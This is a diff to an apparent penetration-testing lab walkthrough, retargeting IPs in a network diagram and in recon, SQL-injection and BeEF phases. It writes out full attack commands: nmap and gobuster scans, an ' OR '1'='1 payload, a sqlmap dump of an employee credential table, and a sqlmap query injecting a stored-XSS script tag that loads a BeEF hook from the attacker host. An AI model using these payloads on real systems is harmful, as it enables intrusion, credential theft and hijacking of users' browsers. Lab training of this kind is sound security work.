@@ -5,24 +5,26 @@
 INTERNET            DMZ                 INTERNAL
 172.16.0.0/24       172.16.1.0/24       172.16.2.0/24
 ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│ kali        │     │ webserver   │     │ WIN-DC01    │
-│ .0.10    ───┼─────┼─► .1.10     ├─────┼─► .2.10     │
-│ (you)       │     │ (WordPress) │     │ (DC)        │
-└─────────────┘     └─────────────┘     │ fileserver  │
-                                        │  .2.20      │
-                                        │ ws01 .2.30  │
-                                        └─────────────┘
+│ kali        │     │ webserver   │     │ DC01        │
+│ .0.10       │     │ .1.10       ├─────┼─► .2.10     │
+│ (you)       │     │ (WordPress) │     │ (AD DC)     │
+│             │     │             │     │ fileserver  │
+│ webserver ◄─┼─────┤             │     │  .2.20      │
+│ .0.100      │     │             │     │ ws01 .2.30  │
+└─────────────┘     └─────────────┘     └─────────────┘
+
+Note: Webserver is multi-homed (.0.100 + .1.10)
 ```
 
 ---
 
 ## Phase 1: Recon
 ```bash
-# Discover hosts
-nmap -sn 172.16.1.0/24
+# Discover hosts on YOUR network
+nmap -sn 172.16.0.0/24
 
-# Scan webserver
-nmap -sV -sC 172.16.1.10
+# Scan webserver (accessible from your network)
+nmap -sV -sC 172.16.0.100
 ```
 
 ---
@@ -30,13 +32,13 @@ nmap -sV -sC 172.16.1.10
 ## Phase 2: SQL Injection
 ```bash
 # Find directories
-gobuster dir -u http://172.16.1.10 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
 
 # Test SQLi (visit in browser or curl)
-http://172.16.1.10/employee-directory/?search=' OR '1'='1
+http://172.16.0.100/employee-directory/?search=' OR '1'='1
 
 # Dump credentials with sqlmap
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
   -D wordpress -T wp_acme_employees --dump --batch
 ```
 
@@ -75,7 +77,7 @@ beef-xss
 # Console: http://127.0.0.1:3000/ui/panel (beef/beef)
 
 # Inject hook via SQLi
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
   --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
 ```
 Wait for victim browser to appear in BeEF console.
